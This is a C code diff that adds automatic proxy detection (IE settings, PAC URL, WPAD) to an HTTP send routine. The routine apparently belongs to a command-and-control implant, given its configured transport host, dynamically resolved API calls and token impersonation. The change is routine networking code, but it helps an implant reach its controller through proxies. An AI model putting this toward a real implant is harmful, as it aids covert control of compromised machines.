@@ -13,8 +13,14 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     LPWSTR  HttpHeader      = NULL;
     LPWSTR  HttpEndpoint    = NULL;
     DWORD   HttpFlags       = 0;
-    DWORD   HttpAccessType  = 0;
     LPCWSTR HttpProxy       = NULL;
+    LPWSTR  HttpUrl         = NULL;
+    SIZE_T  HttpUrlLen      = 0;
+    PWSTR HttpScheme        = NULL;
+
+    WINHTTP_PROXY_INFO ProxyInfo = { 0 };
+    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig = { 0 };
+    WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions = { 0 };
 
     DWORD   Counter         = 0;
     DWORD   Iterator        = 0;
@@ -38,12 +44,19 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     {
         if ( Instance.Config.Transport.Proxy.Enabled )
         {
-            HttpAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+            // Use preconfigured proxy
             HttpProxy      = Instance.Config.Transport.Proxy.Url;
+            
+            /* PRINTF( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent, HttpProxy ) */
+            Instance.hHttpSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+        } 
+        else
+        {
+            // Autodetect proxy settings
+            /* PRINTF( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent ) */
+            Instance.hHttpSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
         }
 
-        /* PRINTF( "WinHttpOpen( %ls, %x, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy ) */
-        Instance.hHttpSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
         if ( ! Instance.hHttpSession )
         {
             PRINTF( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
@@ -112,8 +125,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
 
     if ( Instance.Config.Transport.Proxy.Enabled )
     {
-        WINHTTP_PROXY_INFO ProxyInfo = { 0 };
-
+        // Use preconfigured proxy
         ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
         ProxyInfo.lpszProxy    = Instance.Config.Transport.Proxy.Url;
 
@@ -135,6 +147,77 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
             if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_PASSWORD, Instance.Config.Transport.Proxy.Password, StringLengthW( Instance.Config.Transport.Proxy.Password ) ) )
             {
                 PRINTF( "Failed to set proxy password %u", NtGetLastError() );
+            }
+        }
+    }
+    else
+    {
+        // Autodetect proxy settings
+        if ( Instance.Win32.WinHttpGetIEProxyConfigForCurrentUser(&ProxyConfig) )
+        {
+            if ( ProxyConfig.lpszProxy != NULL && StringLengthW(ProxyConfig.lpszProxy) != 0 )
+            {
+                // IE is set to "use a proxy server"
+                ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+                ProxyInfo.lpszProxy = ProxyConfig.lpszProxy;
+                ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
+
+                if (!Instance.Win32.WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(ProxyInfo)))
+                {
+                    PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+                    goto LEAVE;
+                }
+            }
+            else if ( (ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW(ProxyConfig.lpszAutoConfigUrl) != 0) || ProxyConfig.fAutoDetect == TRUE )
+            {
+                if (ProxyConfig.lpszAutoConfigUrl)
+                {
+                    // IE is set to "Use automatic proxy configuration"
+                    AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
+                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
+                    AutoProxyOptions.dwAutoDetectFlags = 0;
+                }
+                else
+                {
+                    // IE is set to "automatically detect settings"
+                    AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
+                    AutoProxyOptions.lpszAutoConfigUrl = NULL;
+                    AutoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
+                }
+
+                AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
+                AutoProxyOptions.lpvReserved = NULL;
+                AutoProxyOptions.dwReserved = 0;
+
+                // Calculate max URL length
+                // 15 == len("https://" + ":65535" + "\x00")
+                HttpUrlLen = (15 + StringLengthW(Instance.Config.Transport.Host->Host) + StringLengthW(HttpEndpoint));
+                HttpUrl = Instance.Win32.LocalAlloc( LPTR, HttpUrlLen * sizeof(WCHAR) );
+
+                if ( Instance.Config.Transport.Secure )
+                    HttpScheme = L"https";
+                else
+                    HttpScheme = L"http";
+
+                if ( (Instance.Config.Transport.Host->Port == 80 && ! Instance.Config.Transport.Secure) || (Instance.Config.Transport.Host->Port == 443 && Instance.Config.Transport.Secure) )
+                {
+                    if (Instance.Win32.swprintf_s(HttpUrl, HttpUrlLen, L"%s://%s%s", HttpScheme, Instance.Config.Transport.Host->Host, HttpEndpoint) == -1)
+                        goto LEAVE;
+                }
+                else
+                {
+                    if ( Instance.Win32.swprintf_s(HttpUrl, HttpUrlLen, L"%s://%s:%d%s", HttpScheme, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port, HttpEndpoint) == -1 )
+                        goto LEAVE;
+                }
+
+                if ( Instance.Win32.WinHttpGetProxyForUrl(Instance.hHttpSession, HttpUrl, &AutoProxyOptions, &ProxyInfo) )
+                {
+                    if ( !Instance.Win32.WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof(ProxyInfo)) )
+                    {
+                        PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+                        goto LEAVE;
+                    }
+                }
             }
         }
     }
@@ -200,6 +283,18 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
 
     if ( hRequest )
         Instance.Win32.WinHttpCloseHandle( hRequest );
+
+    if ( ProxyConfig.lpszProxy )
+        Instance.Win32.GlobalFree( ProxyConfig.lpszProxy );
+
+    if ( ProxyConfig.lpszProxyBypass )
+        Instance.Win32.GlobalFree( ProxyConfig.lpszProxyBypass );
+
+    if ( ProxyConfig.lpszAutoConfigUrl )
+        Instance.Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );
+
+    if ( HttpUrl )
+        Instance.Win32.LocalFree( HttpUrl );
 
     /* re-impersonate the token */
     TokenImpersonate( TRUE );
